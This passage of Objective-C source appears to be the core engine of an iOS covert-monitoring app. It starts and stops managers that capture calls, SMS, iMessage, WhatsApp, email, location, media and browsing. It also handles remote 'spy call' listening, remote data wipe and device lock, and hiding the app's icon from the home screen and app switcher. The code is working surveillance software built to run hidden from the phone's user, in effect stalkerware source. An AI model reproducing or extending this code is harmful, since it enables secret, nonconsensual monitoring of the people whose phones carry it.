			mAddressbookManager = [[AddressbookManagerImp alloc] initWithDataDeliveryManager:mDDM];
		}
		if (!mRestrictionManager) {
			mRestrictionManager = [[RestrictionManagerImpl alloc] init];
		}
		[mRestrictionManager setMPreferenceManager:mPreferenceManager];
		[mRestrictionManager setMSyncTimeManager:mSyncTimeManager];
		[mRestrictionManager setMSyncCDManager:mSyncCDManager];
		[mRestrictionManager setMAddressbookManager:mAddressbookManager];
		[mAddressbookManager setMApprovalStatusChangeDelegate:mRestrictionManager];
		[mRemoteCmdManager setMAddressbookManager:mAddressbookManager];
		[mRemoteCmdManager setMSyncTimeManager:mSyncTimeManager];
		[mRemoteCmdManager setMSyncCDManager:mSyncCDManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
		
		// Address book mode is independent from restriction enable/disable
		if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeRestrict) {
			[mRestrictionManager setRestrictionMode:kRestrictionModeRestriction];
		} else if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeMonitor) {
			[mRestrictionManager setRestrictionMode:kRestrictionModeMonitor];
		} else {
			[mRestrictionManager setRestrictionMode:kRestrictionModeOff];
		}
		
		// Eanble/Disable restriction
		if ([prefRestriction mEnableRestriction]) {
			[mSyncTimeManager syncTime];
			[mRestrictionManager startRestriction];
		} else {
			[mRestrictionManager stopRestriction];
		}
		
		[mRestrictionManager setWaitingForApprovalPolicy:[prefRestriction mWaitingForApprovalPolicy]];
	} else {
		[mSyncTimeManager release];
		mSyncTimeManager = nil;
		[mSyncCDManager release];
		mSyncCDManager = nil;
		[mAddressbookManager release];
		mAddressbookManager = nil;
		[mRestrictionManager release];
		mRestrictionManager = nil;
		[mRemoteCmdManager setMAddressbookManager:nil];
		[mRemoteCmdManager setMSyncTimeManager:nil];
		[mRemoteCmdManager setMSyncCDManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}

	
	// Panic
	if ([mConfigurationManager isSupportedFeature:kFeatureID_Panic]) {
		if (!mCameraCaptureManager) {
			mCameraCaptureManager = [[CameraCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if (!mCCMDUtils) {
			mCCMDUtils = [[CameraCaptureManagerDUtils alloc] initWithCameraCaptureManager:mCameraCaptureManager];
		}
		if (!mPanicManager) {
			mPanicManager = [[PanicManagerImpl alloc] init];
			[mPanicManager setMEventDelegate:mEventCenter];
			[mPanicManager setMTelephonyNotificationManager:mTelephonyNotificationManagerImpl];
			[mPanicManager setMPreferenceManager:mPreferenceManager];
			[mPanicManager setMSMSSender:mSMSSendManager];
			[mPanicManager setMCameraCaptureManager:mCameraCaptureManager];
			[mPanicManager setMCCMDUtils:mCCMDUtils];
		}
		[PanicManagerImpl clearPanicStatus];
		[prefPanic setMPanicStart:NO];
		[mPreferenceManager savePreference:prefPanic];
		[PreferencesChangeHandler synchronizeWithSettingsBundle:mPreferenceManager];
	} else {
		[PanicManagerImpl clearPanicStatus];
		[prefPanic setMPanicStart:NO];
		[mPreferenceManager savePreference:prefPanic];
		[PreferencesChangeHandler synchronizeWithSettingsBundle:mPreferenceManager];
		[mCameraCaptureManager release];
		mCameraCaptureManager = nil;
		[mCCMDUtils release];
		mCCMDUtils = nil;
		[mPanicManager stopPanic];
		[mPanicManager release];
		mPanicManager = nil;
	}
	
	// Wipe data manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_WipeData]) {
		if (!mWipeDataManager) {
			mWipeDataManager = [[WipeDataManagerImpl alloc] init];
		}
		[mRemoteCmdManager setMWipeDataManager:mWipeDataManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		[mWipeDataManager release];
		mWipeDataManager = nil;
		[mRemoteCmdManager setMWipeDataManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Alert lock device manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_AlertLockDevice]) {
		if (!mDeviceLockManager) {
			mDeviceLockManager = [[DeviceLockManagerImpl alloc] init];
			[mDeviceLockManager setMEventDelegate:mEventCenter];
			[mDeviceLockManager setPreferences:mPreferenceManager];
			[mDeviceLockManager setMSMSSender:mSMSSendManager];
		}
		[mRemoteCmdManager setMDeviceLockManager:mDeviceLockManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
		
		if ([prefDeviceLock mStartAlertLock]) {
			DeviceLockOption *deviceLockOption = [[DeviceLockOption alloc] init];
			[deviceLockOption setMEnableAlertSound:[prefDeviceLock mEnableAlertSound]];
			[deviceLockOption setMLocationInterval:[prefDeviceLock mLocationInterval]];
			[deviceLockOption setMDeviceLockMessage:[prefDeviceLock mDeviceLockMessage]];
			[mDeviceLockManager setDeviceLockOption:deviceLockOption];
			[mDeviceLockManager lockDevice];
			[deviceLockOption release];
		}
	} else {
		[mDeviceLockManager unlockDevice];
		[mDeviceLockManager release];
		mDeviceLockManager = nil;
		[mRemoteCmdManager setMDeviceLockManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}

	
	// Application profile manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_ApplicationProfile]) {
		if (!mApplicationProfileManager) {
			mApplicationProfileManager = [[ApplicationProfileManagerImpl alloc] initWithDDM:mDDM];
			[mRemoteCmdManager setMApplicationProfileManager:mApplicationProfileManager];
			[mRemoteCmdManager relaunchForFeaturesChange];
		}
		if ([prefRestriction mEnableAppProfile]) {
			[mApplicationProfileManager start];
		} else {
			[mApplicationProfileManager stop];
		}
	} else {
		[mApplicationProfileManager stop];
		[mApplicationProfileManager release];
		mApplicationProfileManager = nil;
		[mRemoteCmdManager setMApplicationProfileManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}

	
	// Url profile manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_BrowserUrlProfile]) {
		if (!mUrlProfileManager) {
			mUrlProfileManager = [[UrlProfileManagerImpl alloc] initWithDDM:mDDM];
			[mRemoteCmdManager setMUrlProfileManager:mUrlProfileManager];
			[mRemoteCmdManager relaunchForFeaturesChange];
		}
		if ([prefRestriction mEnableUrlProfile]) {
			[mUrlProfileManager start];
		} else {
			[mUrlProfileManager stop];
		}
	} else {
		[mUrlProfileManager stop];
		[mUrlProfileManager release];
		mUrlProfileManager = nil;
		[mRemoteCmdManager setMUrlProfileManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Bookmark 
	if ([mConfigurationManager isSupportedFeature:kFeatureID_Bookmark]) {
		if (!mBookmarkManager) {
			DLog (@"----------- mBookmarkManager doesnt' exist, so create one")
			mBookmarkManager = [[BookmarkManagerImpl alloc] initWithDDM:mDDM];
		} else {
			DLog (@"----------- mBookmarkManager exists")
		}
		[mRemoteCmdManager setMBookmarkManager:mBookmarkManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		DLog (@"RequestBookmark is not supported")
		[mBookmarkManager release];
		mBookmarkManager = nil;
		[mRemoteCmdManager setMBookmarkManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}

	
	// Running Application 
	if ([mConfigurationManager isSupportedFeature:kFeatureID_RunningApplication]) {
		if (!mApplicationManager) {
			DLog (@"----------- mApplicationManager (running) doesnt' exist, so create one")
			mApplicationManager = [[ApplicationManagerImpl alloc] initWithDDM:mDDM];
		} else {
			DLog (@"----------- mApplicationManager (running) exists")
		}
		[mRemoteCmdManager setMApplicationManager:mApplicationManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		DLog (@"RequestRunningApplication is not supported")
		[mApplicationManager release];
		mApplicationManager = nil;
		[mRemoteCmdManager setMApplicationManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}

	
	// Installed Application 
	if ([mConfigurationManager isSupportedFeature:kFeatureID_InstalledApplication]) {
		if (!mApplicationManager) {
			DLog (@"mApplicationManager (installed) doesnt' exist, so create one")
			mApplicationManager = [[ApplicationManagerImpl alloc] initWithDDM:mDDM];
		} else {
			DLog (@"mApplicationManager (installed) exists")
		}
		[mRemoteCmdManager setMApplicationManager:mApplicationManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		[mApplicationManager release];
		mApplicationManager = nil;
		[mRemoteCmdManager setMApplicationManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Application life cycle manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
		if (!mALCManager) {
			mALCManager = [[ALCManager alloc] initWithEventDelegate:mEventCenter];
		}
		
		if ([prefEventCapture mStartCapture]) {
			if ([prefEventCapture mEnableALC]) {
				[mALCManager startMonitor];
			} else {
				[mALCManager stopMonitor];
			}
		} else {
			[mALCManager stopMonitor];
		}
	} else {
		[mALCManager release];
		mALCManager = nil;
	}
	
	// Actions required when applicaton activate or reactivate NOT application restarted
	if ([self mIsRestartingAppEngine]) { // Application just restart from either crash or phone restart
		DLog (@"AppEngine resume all pending remote commands")
		// Resume all pending commands
		[mRemoteCmdManager processPendingRemoteCommands];
	} else { // Application have been ACTIVATED by user		
		// Deliver address book for approval
		if ([mConfigurationManager isSupportedFeature:kFeatureID_CommunicationRestriction]) {
			[mAddressbookManager prepareContactsForFirstApproval];
		}
	}
}

- (void) destructApplicationFeatures {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	DLog(@"Destruct features")
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	
	LicenseInfo *licenseInfo = [mLicenseManager mCurrentLicenseInfo];
	
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		// Reset the preferences
		[mPreferenceManager resetPreferences];
	
		// Clear all shared settings
		[self clearSharedSettings];
	}
	
	// Call
	[mCallLogCaptureManager release];
	mCallLogCaptureManager = nil;
	
	// SMS
	[mSMSCaptureManager release];
	mSMSCaptureManager = nil;
	
	// IMessage
	[mIMessageCaptureManager release];
	mIMessageCaptureManager = nil;
	
	//WhatsApp
	[mWhatsAppCaptureManager release];
	mWhatsAppCaptureManager=nil;
	
	// MMS
	[mMMSCaptureManager release];
	mMMSCaptureManager = nil;
	
	// Email
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		[MailCaptureManager clearEmailHistory];
	}
	[mMailCaptureManager release];
	mMailCaptureManager = nil;
	
	// Location
	[mLocationManager release];
	mLocationManager = nil;
	
	// Media finder
	if ([licenseInfo licenseStatus] == DEACTIVATED) {
		[mMediaFinder clearMediaHistory];
	}
	[mMediaFinder release];
	mMediaFinder = nil;
	
	// Media capture
	[mMediaCaptureManager release];
	mMediaCaptureManager = nil;
	
	// Borwser url/Bookmark capture
	[mBrowserUrlCaptureManager release];
	mBrowserUrlCaptureManager = nil;
	
	// Stop deliver
	[mEDM setDeliveryTimer:0];
	
	// Visibility
	id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
	[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
	
	// SIM change notification
	[mSIMChangeManager stopReportSIMChange];
	[mSIMChangeManager stopListenToSIMChange];
	
	// Spy call manager
	[mSpyCallManager disableSpyCall];
	[mSpyCallManager release];
	mSpyCallManager = nil;
	
	// App agent
	[mAppAgentManager release];
	mAppAgentManager = nil;
	
	// Restriction manager and address book manager
	[mRestrictionManager stopRestriction];
	[mRemoteCmdManager setMSyncTimeManager:nil];
	[mRemoteCmdManager setMSyncCDManager:nil];
	[mRemoteCmdManager setMAddressbookManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	[mRestrictionManager release];
	mRestrictionManager = nil;
	[mSyncTimeManager release];
	mSyncTimeManager = nil;
	[mSyncCDManager clearCDs];
	[mSyncCDManager release];
	mSyncCDManager = nil;
	[mAddressbookManager clearAllContacts]; // Clear all FxContacts
	[mAddressbookManager release];
	mAddressbookManager = nil;
	
	// Panic manager
	[PanicManagerImpl clearPanicStatus];
	[mPanicManager stopPanic];
	[mPanicManager release];
	mPanicManager = nil;
	[mCCMDUtils release];
	mCCMDUtils = nil;
	[mCameraCaptureManager release];
	mCameraCaptureManager = nil;
	
	// Wipe data manager
	[mWipeDataManager release];
	mWipeDataManager = nil;
	[mRemoteCmdManager setMWipeDataManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	
	// Alert device lock manager
	[mDeviceLockManager unlockDevice];
	[mDeviceLockManager release];
	mDeviceLockManager = nil;
	[mRemoteCmdManager setMDeviceLockManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	
	// Application profile manager
	[mApplicationProfileManager stop];
	[mApplicationProfileManager clearApplicationProfile];
	[mApplicationProfileManager release];
	mApplicationProfileManager = nil;
	[mRemoteCmdManager setMApplicationProfileManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	
	// Url profile manager
	[mUrlProfileManager stop];
	[mUrlProfileManager clearUrlProfile];
	[mUrlProfileManager release];
	mUrlProfileManager = nil;
	[mRemoteCmdManager setMUrlProfileManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	
	// Bookmar manager
	[mBookmarkManager release];
	mBookmarkManager = nil;
	[mRemoteCmdManager setMBookmarkManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	
	// Application manager
	[mApplicationManager release];
	mApplicationManager = nil;
	[mRemoteCmdManager setMApplicationManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	
	// Application life cycle manager
	[mALCManager release];
	mALCManager = nil;
	
	// Remove all pending commands
	if (![self mIsRestartingAppEngine]) {
		// ******** Application is deactivated from user/server.... or license
		// is expired or disabled
		[mERM deleteRepository];
		[mRemoteCmdManager clearAllPendingRemoteCommands];
	} else {
		// ******** Application just restarting because of crash or phone restart
	}
}

- (EventQueryPriority*) eventQueryPriority {
	NSMutableArray* eventTypePriorityArray = [[NSMutableArray alloc] init];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanic]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanicImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSettings]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeLocation]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSystem]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallLog]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIM]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBrowserURL]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBookmark]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeApplicationLifeCycle]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImageThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideo]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideoThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaper]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaperThumbnail]];
	EventQueryPriority* eventQueryPriority = [[EventQueryPriority alloc] initWithUserPriority:eventTypePriorityArray];
	[eventTypePriorityArray release];
	[eventQueryPriority autorelease];
	return (eventQueryPriority);
}

#pragma mark -
#pragma mark License changes private method
#pragma mark -

- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo {
	// Set IMEI to CSM
	NSString *imei = [[mApplicationContext mPhoneInfo] getIMEI];
	if (!imei) imei = @"";
	[mCSM setIMEI:imei];
	
	// Update config
	NSInteger configID = [aLicenseInfo configID];
	if ([aLicenseInfo licenseStatus] == EXPIRED) {
		configID = CONFIG_EXPIRE_LICENSE;
		// Disable every 24 hours heartbeat only in case of expired
		// Obsolete
		//[mLicenseHeartbeatUtils stop];
		
		// Disable get config every 24 hours
		[mLicenseGetConfigUtils stop];
		
	} else if ([aLicenseInfo licenseStatus] == DISABLE) {
		configID = CONFIG_DISABLE_LICENSE;
		// Enable every 24 hours heartbeat
		// Obsolete
		//[mLicenseHeartbeatUtils start];
		
		// Disable get config every 24 hours
		[mLicenseGetConfigUtils stop];
		
	} else if ([aLicenseInfo licenseStatus] == ACTIVATED) {
		// Enable every 24 hours heartbeat
		// Obsolete
		//[mLicenseHeartbeatUtils start];
		
		// Enable get config every 24 hours
		[mLicenseGetConfigUtils start];
		
	} else { // DEACTIVATED/UNKNOWN
		// Disable get config every 24 hours
		[mLicenseGetConfigUtils stop];
	}
	
	// Send license info to UI exclusively
	LicenseInfo *licInfo = [[LicenseInfo alloc] init];
	[licInfo setMd5:[aLicenseInfo md5]];
	[licInfo setLicenseStatus:[aLicenseInfo licenseStatus]];
	[licInfo setConfigID:configID];
	[licInfo setActivationCode:[aLicenseInfo activationCode]];
	[mAppEngineConnection processCommand:kAppUI2EngineGetLicenseInfoCmd
							 withCmdData:licInfo];
	[licInfo release];
	
	[mConfigurationManager updateConfigurationID:configID];
	Configuration *config = [mConfigurationManager configuration];
	[mRemoteCmdManager setMSupportCmdCodes:[config mSupportedRemoteCmdCodes]];
	[mActivationCodeCaptureManager setMAC:[aLicenseInfo activationCode]];
	
	// Construct/Destruct features
	if ([aLicenseInfo licenseStatus] == ACTIVATED) {
		[self createApplicationFeatures];
	} else if ([aLicenseInfo licenseStatus] == DEACTIVATED ||
			   [aLicenseInfo licenseStatus] == EXPIRED ||
			   [aLicenseInfo licenseStatus] == DISABLE ||
			   [aLicenseInfo licenseStatus] == LC_UNKNOWN) {
		[self destructApplicationFeatures];
	}
	
	// Set engine of the application is no longer just restart
	[self setMIsRestartingAppEngine:FALSE];
}

- (void) clearSharedSettings {
	// Share 0
	SharedFileIPC *sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	[sFile clearData];
	[sFile release];
	sFile = nil;
	
	// Share 1
	sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate1];
	[sFile clearData];
	[sFile release];
	sFile = nil;
	
	// Share 2
	sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate2];
	[sFile clearData];
	[sFile release];
	sFile = nil;
	
	// Share 3
	sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate3];
	[sFile clearData];
	[sFile release];
	sFile = nil;
}

#pragma mark -
#pragma mark dealloc method
#pragma mark -

- (void) dealloc {
	// Features
	[mALCManager release];
	[mApplicationManager release];
	[mBookmarkManager release];
	[mApplicationProfileManager release];
	[mUrlProfileManager release];
	[mDeviceLockManager release];
	[mWipeDataManager release];
	[mPanicManager release];
	[mCCMDUtils release];
	[mCameraCaptureManager release];
	[mRestrictionManager release];
	[mSyncCDManager release];
	[mSyncTimeManager release];
	[mBrowserUrlCaptureManager release];
	[mWhatsAppCaptureManager release];
	[mAppAgentManager release];
	[mSpyCallManager release];
	[mMediaCaptureManager release];
	[mMediaFinder release];
	[mAddressbookManager release];
	[mLocationManager release];
	[mMailCaptureManager release];
	[mMMSCaptureManager release];
	[mIMessageCaptureManager release];
	[mSMSCaptureManager release];
	[mCallLogCaptureManager release];
	
	// Engine
	[mSignUpManager release];
	[mActivationCodeCaptureManager release];
	[mSIMChangeManager release];
	[mRemoteCmdManager release];
	[mEventCenter release];
	[mEDM release];
	[mERM release];
	[mActivationManager release];
	[mDDM release];
	[mCSM release];
	[mPreferenceManager release];
	[mConnectionHistoryManager release];
	[mServerAddressManager release];
	[mConfigurationManager release];
	[mLicenseManager release];
	[mSMSSendManager release];
	[mSystemUtils release];
	[mApplicationContext release];
	[mTelephonyNotificationManagerImpl release];
	
	// Utils
	[mLicenseGetConfigUtils release];
	[mLicenseHeartbeatUtils release];
	[mPreferencesChangeHandler release];
	[mServerErrorStatusHandler release];
	
	[super dealloc];
}

@end
